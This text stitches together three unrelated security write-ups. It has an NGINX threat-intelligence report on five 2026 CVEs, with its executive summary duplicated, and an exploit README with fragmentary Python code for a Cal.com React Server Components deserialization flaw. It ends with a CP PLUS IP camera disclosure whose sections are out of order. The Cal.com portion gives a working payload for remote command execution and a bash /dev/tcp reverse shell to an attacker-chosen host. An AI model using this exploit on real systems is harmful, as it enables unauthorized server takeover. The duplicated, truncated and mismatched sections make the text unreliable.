# NGINX 2026 Multi-CVE CTI Investigation Report

**CVEs:** CVE-2026-28755, CVE-2026-42926, CVE-2026-9256, CVE-2026-42055, CVE-2026-42533  
**Vendor / Project:** F5 / NGINX Open Source / NGINX Plus

**Created by:** Pratik Chhetri

**Evidence Collection Timestamp:** 2026-07-28T12:54:49+05:30 / 2026-07-28T07:24:49Z  
**Scope:** Public CVE records, F5 advisories, nginx.org advisories/news, NVD, FIRST EPSS, CISA KEV, public GitHub metadata, Exploit-DB, Metasploit repository checks, and public security reporting. No exploit execution, live-target testing, or unauthorized validation was performed.

---

## 1. Executive Summary

This report covers five NGINX vulnerabilities disclosed and fixed across March to July 2026:

| CVE | Short name | Primary risk | Highest vendor score | Current priority |
|---|---|---|---:|---:|
| CVE-2026-28755 | OCSP result bypass in stream | Revoked client certificate may still complete TLS handshake under specific stream mTLS/OCSP configuration | CVSS v3.1 5.4 Medium | P3 / P2 for mTLS gateways |
| CVE-2026-42926 | HTTP/2 request injection in proxy module | Inject HTTP/2 frame headers/payload bytes to upstream peer when `proxy_http_version 2` and `proxy_set_body` are used | CVSS v4.0 6.3 Medium | P2 |
| CVE-2026-9256 | Rewrite module heap overflow | Remote unauthenticated crafted requests can cause worker restart and possible code execution if ASLR is disabled or bypassed | CVSS v4.0 9.2 Critical | P1 |
| CVE-2026-42055 | Proxy v2 / gRPC heap overflow | Remote unauthenticated large-header path can cause worker restart and possible code execution in specific non-default HTTP/2 proxy/gRPC configs | CVSS v4.0 9.2 Critical | P1 |
| CVE-2026-42533 | Map directive regex heap overflow | Remote unauthenticated crafted requests can crash worker and may allow code execution in vulnerable regex-map configurations | CVSS v4.0 9.2 Critical | P0/P1 |

The common operational theme is **configuration-dependent exposure**. These vulnerabilities do not affect every NGINX deployment equally. Risk is highest for internet-facing reverse proxies, API gateways, ingress controllers, gRPC gateways, and NGINX Plus deployments using the vulnerable directives/modules documented by F5 and nginx.org.

**Exploitation status:** None of the five CVEs were found in CISA KEV as of collection time [E11]. F5/CVE Services CISA ADP data marks exploitation as **none** for all five CVEs [E1]. Public GitHub metadata indicates public research/scanner/PoC-style repositories exist for CVE-2026-42926, CVE-2026-9256, CVE-2026-42055, and CVE-2026-42533, but Exploit-DB and Metasploit checks found no entries/modules for these CVEs [E9][E12][E13]. No verified ransomware or APT usage was found.

**Immediate actions:**

1. Inventory NGINX Open Source, NGINX Plus, NGINX Ingress Controller, NGINX Gateway Fabric, NGINX Instance Manager, and F5 WAF/App Protect products.
2. Upgrade to fixed versions listed by F5/nginx.org.
3. Prioritize CVE-2026-42533, CVE-2026-42055, and CVE-2026-9256 on internet-facing data-plane systems.
4. Audit configurations for vulnerable directives: `map` with regex captures, `rewrite` with overlapping captures, `proxy_http_version 2`, `proxy_set_body`, `grpc_pass`, `ignore_invalid_headers off`, `large_client_header_buffers > 2m`, `ssl_verify_client on`, and `ssl_ocsp on`.
5. Monitor for NGINX worker crashes, abnormal 5xx spikes, unexpected worker restarts, and NGINX child process execution.

## 1. Executive Summary

This report covers five NGINX vulnerabilities disclosed and fixed across March to July 2026:

| CVE | Short name | Primary risk | Highest vendor score | Current priority |
|---|---|---|---:|---:|
| CVE-2026-28755 | OCSP result bypass in stream | Revoked client certificate may still complete TLS handshake under specific stream mTLS/OCSP configuration | CVSS v3.1 5.4 Medium | P3 / P2 for mTLS gateways |
| CVE-2026-42926 | HTTP/2 request injection in proxy module | Inject HTTP/2 frame headers/payload bytes to upstream peer when `proxy_http_version 2` and `proxy_set_body` are used | CVSS v4.0 6.3 Medium | P2 |
| CVE-2026-9256 | Rewrite module heap overflow | Remote unauthenticated crafted requests can cause worker restart and possible code execution if ASLR is disabled or bypassed | CVSS v4.0 9.2 Critical | P1 |
| CVE-2026-42055 | Proxy v2 / gRPC heap overflow | Remote unauthenticated large-header path can cause worker restart and possible code execution in specific non-default HTTP/2 proxy/gRPC configs | CVSS v4.0 9.2 Critical | P1 |
| CVE-2026-42533 | Map directive regex heap overflow | Remote unauthenticated crafted requests can crash worker and may allow code execution in vulnerable regex-map configurations | CVSS v4.0 9.2 Critical | P0/P1 |

The common operational theme is **configuration-dependent exposure**. These vulnerabilities do not affect every NGINX deployment equally. Risk is highest for internet-facing reverse proxies, API gateways, ingress controllers, gRPC gateways, and NGINX Plus deployments using the vulnerable directives/modules documented by F5 and nginx.org.

**Exploitation status:** None of the five CVEs were found in CISA KEV as of collection time [E11]. F5/CVE Services CISA ADP data marks exploitation as **none** for all five CVEs [E1]. No verified ransomware or APT usage was found.

2. Upgrade to fixed versions listed by F5/nginx.org.

# CVE-2025-71389 — Cal.com Unauthenticated RCE (react2shell)

Unauthenticated remote code execution in [Cal.com](https://github.com/calcom/cal.com)
`<= 5.9.8` via the **React Server Components "Flight" deserialization** flaw —
"**react2shell**" (**CVE-2025-55182** in React, **CVE-2025-66478** in Next.js).

Cal.com bundles a vulnerable Next.js 15.x. A single unauthenticated `POST /` carrying a
`Next-Action` header and a crafted multipart Flight payload walks a prototype-pollution
chain (`__proto__:then` + `constructor:constructor`) into a server-side `eval`, reaching
`child_process.execSync`. The command's output is returned inline in the RSC error
`digest` field. No authentication, no user interaction — a single request is RCE.

- **Affected:** Cal.com `<= 5.9.8` (Next.js 15.x / 16.x App Router with RSC)
- **Fixed in:** Cal.com `5.9.9` (bumps the bundled Next.js)
- **Default port:** `3000`
- **CWE:** 502 / 94
- **Underlying:** CVE-2025-55182 (React), CVE-2025-66478 (Next.js)

## Requirements

```bash
pip install requests
```

## Usage

```bash
# one-off command (output comes back in the response)
python3 exploit.py http://10.10.10.10:3000/ -c 'id'
python3 exploit.py http://10.10.10.10:3000/ -c 'cat /root/proof.txt'

# interactive reverse shell (start `nc -lvnp 4444` first)
python3 exploit.py http://10.10.10.10:3000/ --shell 10.10.14.5:4444
```

The one-off command returns its output inline via the RSC error `digest`. The `--shell`
mode fires a `setsid`-detached `bash` `/dev/tcp` reverse shell (the target's container is
Debian and ships `bash`).

## Remediation

Upgrade Cal.com to `>= 5.9.9` (any patched Next.js: 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 /
15.4.8 / 15.5.7 / 16.0.7). Do not expose the RSC server-function handler to untrusted
clients, and don't run the app container as root.

## Disclaimer

For authorized security testing and education only. Use it only against systems you own
or have explicit permission to test.

import argparse
import json
import re

import requests


def cmd_prefix(cmd):
    return (
        "var res = process.mainModule.require('child_process')"
        f".execSync('{cmd}',{{'timeout':10000}}).toString();"
        "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"

def shell_prefix(host, port):
    rs = f'setsid bash -c "bash -i >& /dev/tcp/{host}/{int(port)} 0>&1" >/dev/null 2>&1 &'
    return (
        "process.mainModule.require('child_process')"
        f".execSync('{rs}',{{'timeout':5000}});"
        "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`sent`});"
    )


def send(target, prefix):
    payload = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    files = {"0": (None, json.dumps(payload)), "1": (None, '"$@0"')}
    return requests.post(target, files=files, headers={"Next-Action": "x"}, timeout=20)

    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-c", "--cmd", help="run a single command (output returned inline)")
    g.add_argument("--shell", metavar="HOST:PORT", help="spawn a reverse shell to HOST:PORT")

        print(f"[*] sending reverse shell to {host}:{port}")
        send(args.target, shell_prefix(host, port))
        print("[+] payload sent")

    main()

## Impact

### CVE-2026-65893
- Arbitrary code execution with elevated privileges on the device.
- Full compromise of confidentiality, integrity, and availability (CVSS 4.0: 7.0 High).
- Requires physical access, which limits — but does not eliminate — real-world risk (e.g., supply-chain tampering, installer/insider access, device left in unsecured locations).

### CVE-2026-65894
- Unauthorized remote access to live video snapshots via brute-forced HTTP authentication.
- Direct privacy impact for end-users (unauthorized viewing of camera feed).

## Mitigation / Recommendations
- Apply the vendor-released firmware update as soon as it is available.
- Disable or lock down any debug/service interfaces not required for normal operation.
- Restrict physical access to the device and any removable-media interfaces.
- Enforce strong, unique credentials on all HTTP-exposed endpoints.
- Implement rate-limiting / account lockout on authentication endpoints to prevent brute-force attacks.
- Segment IP cameras on an isolated network/VLAN, away from critical infrastructure.

## Overview

This repository documents two security vulnerabilities identified in the **CP PLUS EZ-P21 IP Camera**, an IP-based surveillance camera used for video monitoring and network-based access to camera functions and snapshots.

Both issues were **responsibly disclosed**, coordinated through the vendor/CERT process, and assigned CVE identifiers.

---

## Vulnerability Summary

| CVE | Title | CWE | Vector |
|---|---|---|---|
| **CVE-2026-65893** | Arbitrary Code Execution via insecure debug feature | CWE-489 (Debug Feature) | Physical Access |
| **CVE-2026-65894** | Improper Authentication of HTTP endpoints | CWE-287 (Improper Authentication) | Network / Remote |

- **Product**: CP PLUS EZ-P21 IP Camera
- **CVSS v4.0 (CVE-2026-65893)**: 7.0 (High) — `AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H`
- **Status**: Fixed by vendor

---

## 1. CVE-2026-65893 — Arbitrary Code Execution

This vulnerability exists due to an insecure debug feature enabled in the firmware. An attacker with **physical access** could place arbitrary code on removable media and trigger its execution through the debug mechanism, resulting in code execution with **elevated privileges**.

## 2. CVE-2026-65894 — Improper Authentication

This vulnerability exists due to improper authentication of HTTP endpoints. A **remote attacker** could conduct brute-force attacks against the HTTP endpoint, gaining **unauthorized access to live video snapshots** from the targeted device.

See [`Vulnerability_Overview.md`](./Vulnerability_Overview.md) and [`Technical_Analysis.md`](./Technical_Analysis.md) for details.
